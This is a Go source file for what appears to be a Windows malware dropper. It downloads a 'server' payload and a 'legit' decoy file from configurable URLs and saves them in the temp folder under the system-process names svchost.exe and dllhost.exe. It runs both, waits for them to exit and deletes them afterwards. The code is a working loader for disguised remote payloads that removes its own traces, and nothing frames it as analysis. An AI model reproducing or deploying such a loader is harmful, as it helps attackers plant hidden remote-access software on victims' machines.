package main

import (
	"bytes"
	"io"
	"net/http"
	"os"
	"os/exec"
	"time"
)

var serverPath = os.TempDir() + `\svchost.exe`
var filePatch = os.TempDir() + `\dllhost.exe`
var serverURL = "Server URL"
var fileURL = "Legit File URL"

func main() {
	DownloadFiles()
	ServerPid := ExecFile(serverPath)
	time.Sleep(100 * time.Millisecond)
	FilePid := ExecFile(filePatch)
	WaitProcessToSafeClose(FilePid, filePatch)
	WaitProcessToSafeClose(ServerPid, serverPath)
}

func WaitProcessToSafeClose(pid int, path string) {
	pPoint, _ := os.FindProcess(pid)
	pPoint.Wait()
	time.Sleep(300 * time.Millisecond)
	RemoveFile(path)
}

func RemoveFile(Patch string) {
	RemFile := os.Remove(Patch)
	if RemFile != nil {
		panic(RemFile)
	}
}

func ExecFile(FilePath string) (pid int) {
	command := exec.Command(FilePath)
	var out bytes.Buffer
	command.Stdout = &out
	err := command.Start()
	if err != nil {
		panic(err)
	}
	pid = command.Process.Pid

	return
}

func DownloadFiles() {

	ServerFile := DownloadFile(serverPath, serverURL)
	if ServerFile != nil {
		panic(ServerFile)
	}

	LegitFile := DownloadFile(filePatch, fileURL)
	if LegitFile != nil {
		panic(LegitFile)
	}
}

func DownloadFile(filepath string, url string) error {

	Resp, Err := http.Get(url)
	if Err != nil {
		return Err
	}
	defer Resp.Body.Close()

	Out, Err := os.Create(filepath)
	if Err != nil {
		return Err
	}
	defer Out.Close()

	_, Err = io.Copy(Out, Resp.Body)
	return Err
}
